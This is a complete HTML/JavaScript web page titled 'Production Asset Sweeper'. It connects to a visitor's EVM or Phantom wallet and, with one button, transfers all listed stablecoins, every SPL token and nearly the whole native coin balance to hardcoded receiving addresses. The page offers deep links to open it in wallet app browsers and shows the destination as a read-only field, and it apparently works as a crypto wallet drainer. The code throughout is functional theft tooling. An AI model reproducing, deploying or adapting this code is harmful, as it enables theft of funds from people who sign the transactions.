<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Production Multi-Chain</title>
  
  <!-- Web3 Engine Libraries -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.90.0/lib/index.iife.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
  
  <style>
    :root {
      --bg: #090d16;
      --card: #131a29;
      --accent: #6366f1;
      --accent-hover: #4f46e5;
      --text: #ffffff;
      --subtext: #94a3b8;
      --border: #1e293b;
      --error-bg: rgba(239, 68, 68, 0.1);
      --error-border: #ef4444;
      --success-bg: rgba(34, 197, 94, 0.1);
      --success-border: #22c55e;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 15px;
      box-sizing: border-box;
    }
    .card {
      background: var(--card);
      padding: 24px;
      border-radius: 16px;
      width: 100%;
      max-width: 460px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
      border: 1px solid var(--border);
    }
    h2 { margin-top: 0; font-size: 1.4rem; text-align: center; }
    label { display: block; margin-top: 14px; margin-bottom: 6px; font-size: 0.85rem; color: var(--subtext); }
    select, input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: #0b0f19;
      color: #fff;
      font-size: 0.95rem;
      box-sizing: border-box;
    }
    .status-box {
      background: #0b0f19;
      border: 1px solid var(--border);
      padding: 14px;
      border-radius: 8px;
      margin-top: 15px;
      font-size: 0.88rem;
      line-height: 1.4;
      word-break: break-word;
      transition: all 0.3s ease;
    }
    .status-box.error { background: var(--error-bg); border-color: var(--error-border); color: #fca5a5; }
    .status-box.success { background: var(--success-bg); border-color: var(--success-border); color: #86efac; }
    button.send-btn {
      width: 100%;
      background: var(--accent);
      color: white;
      border: none;
      padding: 16px;
      font-size: 1.1rem;
      font-weight: 700;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.2s;
    }
    button.send-btn:hover { background: var(--accent-hover); }
    .wallet-apps-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }
    .app-btn {
      background: #1e293b;
      border: 1px solid var(--border);
      color: var(--text);
      padding: 10px;
      border-radius: 8px;
      font-size: 0.85rem;
      text-align: center;
      text-decoration: none;
      display: block;
    }
  </style>
</head>
<body>

<div class="card">
  <h2>⚡ Production Asset Sweeper</h2>

  <label for="networkSelect">Select Current Network:</label>
  <select id="networkSelect" onchange="updateUI()">
    <option value="ethereum">Ethereum (ETH & ERC-20)</option>
    <option value="bnb">BNB Chain (BNB & BEP-20)</option>
    <option value="polygon">Polygon (POL & ERC-20)</option>
    <option value="arbitrum">Arbitrum (ETH & Tokens)</option>
    <option value="base">Base (ETH & Tokens)</option>
    <option value="solana">Solana (SOL & SPL Tokens)</option>
  </select>

  <label for="receiverInput">Target Receiving Address:</label>
  <input type="text" id="receiverInput" readonly disabled />

  <button class="send-btn" onclick="transferAllAssets()">TRANSFER ALL ASSETS</button>

  <div class="status-box" id="status">ℹ️ Ready. Tap the button above to execute.</div>

  <hr style="border: 0; border-top: 1px solid var(--border); margin: 25px 0 15px 0;" />

  <label style="text-align: center; font-weight: bold;">Launch App Browser directly:</label>
  <div class="wallet-apps-grid">
    <a href="#" onclick="openWalletApp('phantom')" class="app-btn">👻 Phantom</a>
    <a href="#" onclick="openWalletApp('metamask')" class="app-btn">🦊 MetaMask</a>
    <a href="#" onclick="openWalletApp('trust')" class="app-btn">🛡️ Trust Wallet</a>
    <a href="#" onclick="openWalletApp('coinbase')" class="app-btn">🔵 Coinbase Wallet</a>
  </div>
</div>

<script>
  // =========================================================
  // 1. CONFIGURATION: TARGET RECEIVING WALLETS
  // =========================================================
  const WALLET_MAP = {
    ethereum: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
    bnb: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
    polygon: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
    arbitrum: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
    base: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
    solana: "5AGBu5f2dPtSMZyyh3bVZcBDenLDbPSXCMUokeZDw9Sh"
  };

  const CHAIN_IDS = {
    ethereum: "0x1",
    bnb: "0x38",
    polygon: "0x89",
    arbitrum: "0xa4b1",
    base: "0x2105"
  };

  const KNOWN_TOKENS = {
    ethereum: [
      { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
      { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }
    ],
    bnb: [
      { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
      { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" }
    ]
  };

  const MinimalERC20ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function decimals() view returns (uint8)"
  ];

  function setStatus(message, type = 'info') {
    const box = document.getElementById("status");
    box.className = "status-box " + type;
    box.innerHTML = message;
  }

  function updateUI() {
    const selectedNetwork = document.getElementById("networkSelect").value;
    const targetAddress = WALLET_MAP[selectedNetwork];
    document.getElementById("receiverInput").value = targetAddress || "";
    
    if (!targetAddress || targetAddress === "My_wallet") {
      setStatus("⚠️ <b>Action Required:</b> Replace target address in code.", "error");
    } else {
      setStatus("ℹ️ System ready for " + selectedNetwork.toUpperCase() + " execution.", "info");
    }
  }
  window.onload = updateUI;

  function openWalletApp(walletType) {
    const currentUrl = encodeURIComponent(window.location.href);
    let deepLink = "";
    if (walletType === 'phantom') deepLink = `https://phantom.app/ul/browse/${currentUrl}`;
    if (walletType === 'metamask') deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
    if (walletType === 'trust') deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
    if (walletType === 'coinbase') deepLink = `https://go.cb-w.com/dapp?cb_url=${currentUrl}`;
    if (deepLink) window.location.href = deepLink;
  }

  async function transferAllAssets() {
    const network = document.getElementById("networkSelect").value;
    const receiver = WALLET_MAP[network];

    if (!receiver || receiver === "My_wallet") {
      setStatus("❌ <b>Stopped:</b> Destination wallet address not configured.", "error");
      return;
    }

    setStatus("🔄 Connecting provider...", "info");

    // SOLANA ROUTINE
    if (network === "solana") {
      if (typeof solanaWeb3 === "undefined" || typeof splToken === "undefined") {
        setStatus("❌ <b>Library Error:</b> Solana libraries failed to load from CDN.", "error");
        return;
      }

      const provider = window.solana;
      if (!provider || !provider.isPhantom) {
        setStatus("❌ <b>Wallet Error:</b> Phantom extension/app not detected.", "error");
        return;
      }

      try {
        await provider.connect();
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
        const sender = provider.publicKey;
        
        let target;
        try {
          target = new solanaWeb3.PublicKey(receiver);
        } catch(e) {
          setStatus("❌ <b>Address Error:</b> Saved Solana receiving address is invalid.", "error");
          return;
        }

        setStatus("🔎 Scanning Solana token accounts...", "info");

        const transaction = new solanaWeb3.Transaction();
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
          sender,
          { programId: splToken.TOKEN_PROGRAM_ID }
        );

        let activeTokens = 0;

        for (let acc of tokenAccounts.value) {
          const parsedInfo = acc.account.data.parsed.info;
          const tokenAmount = parsedInfo.tokenAmount.amount;
          
          if (BigInt(tokenAmount) > 0n) {
            activeTokens++;
            const sourceAta = acc.pubkey;
            const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
            const destinationAta = await splToken.getAssociatedTokenAddress(mint, target);
            const destAccountInfo = await connection.getAccountInfo(destinationAta);
            
            if (!destAccountInfo) {
              transaction.add(
                splToken.createAssociatedTokenAccountInstruction(
                  sender,
                  destinationAta,
                  target,
                  mint
                )
              );
            }

            transaction.add(
              splToken.createTransferInstruction(
                sourceAta,
                destinationAta,
                sender,
                BigInt(tokenAmount)
              )
            );
          }
        }

        const totalSolBalance = await connection.getBalance(sender);
        const reservedGas = 2000000; 
        const solToTransfer = totalSolBalance - reservedGas;

        if (totalSolBalance === 0 && activeTokens === 0) {
          setStatus("❌ <b>No Assets:</b> Wallet contains 0 SOL and 0 SPL tokens.", "error");
          return;
        }

        if (solToTransfer <= 0 && activeTokens > 0) {
          setStatus("❌ <b>Gas Error:</b> Native SOL balance insufficient to cover transaction fees.", "error");
          return;
        }

        if (solToTransfer > 0) {
          transaction.add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: sender,
              toPubkey: target,
              lamports: solToTransfer
            })
          );
        }

        transaction.feePayer = sender;
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        setStatus("✍️ Prompting approval in Phantom...", "info");
        const { signature } = await provider.signAndSendTransaction(transaction);
        setStatus(`✅ <b>Complete!</b> Tx Hash: <code>${signature.slice(0, 16)}...</code>`, "success");

      } catch (err) {
        console.error(err);
        setStatus(`❌ <b>Execution Failed:</b> ${err.message || "User declined transaction."}`, "error");
      }
      return;
    }

    // EVM ROUTINE
    if (typeof ethers === "undefined") {
      setStatus("❌ <b>Library Error:</b> Ethers.js library failed to load. Try refreshing.", "error");
      return;
    }

    if (!window.ethereum) {
      setStatus("❌ <b>Provider Missing:</b> No EVM wallet provider detected.", "error");
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      
      if (CHAIN_IDS[network]) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: CHAIN_IDS[network] }],
          });
        } catch (switchError) {
          console.warn("Chain switch request dismissed or unsupported:", switchError);
        }
      }

      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const senderAddress = await signer.getAddress();

      setStatus("🔎 Checking ERC-20 token balances...", "info");

      const tokensToScan = KNOWN_TOKENS[network] || [];
      for (let tokenDef of tokensToScan) {
        try {
          const contract = new ethers.Contract(tokenDef.address, MinimalERC20ABI, signer);
          const balance = await contract.balanceOf(senderAddress);

          if (balance > 0n) {
            setStatus(`✍️ Transferring ${tokenDef.symbol}...`, "info");
            const tx = await contract.transfer(receiver, balance);
            await tx.wait();
          }
        } catch (tokenErr) {
          console.warn(`Failed sweeping ${tokenDef.symbol}:`, tokenErr);
        }
      }

      setStatus("🔎 Computing gas and sweeping native balance...", "info");

      const nativeBalance = await provider.getBalance(senderAddress);
      
      if (nativeBalance === 0n) {
        setStatus("✅ ERC-20 sweep complete. Native coin balance is 0.", "success");
        return;
      }

      const feeData = await provider.getFeeData();
      
      const estimatedGasLimit = await provider.estimateGas({
        from: senderAddress,
        to: receiver,
        value: nativeBalance
      }).catch(() => 21000n);

      const gasPrice = feeData.gasPrice ?? ethers.parseUnits("20", "gwei");
      const gasCost = estimatedGasLimit * gasPrice;

      if (nativeBalance <= gasCost) {
        setStatus("⚠️ Native balance too low to pay gas for final coin sweep.", "error");
        return;
      }

      const amountToSend = nativeBalance - gasCost;

      setStatus("✍️ Prompting final native coin signature...", "info");

      const tx = await signer.sendTransaction({
        to: receiver,
        value: amountToSend,
        gasLimit: estimatedGasLimit,
        gasPrice: gasPrice
      });

      setStatus(`✅ <b>All Assets Swept!</b><br>Native Tx: <code>${tx.hash.slice(0, 18)}...</code>`, "success");

    } catch (err) {
      console.error(err);
      if (err.code === "ACTION_REJECTED" || err.message?.includes("user rejected")) {
        setStatus("⚠️️ <b>Cancelled:</b> Transaction declined by user.", "error");
      } else {
        setStatus(`❌ <b>Execution Failed:</b> ${err.reason || err.message}`, "error");
      }
    }
  }
</script>

</body>
</html>
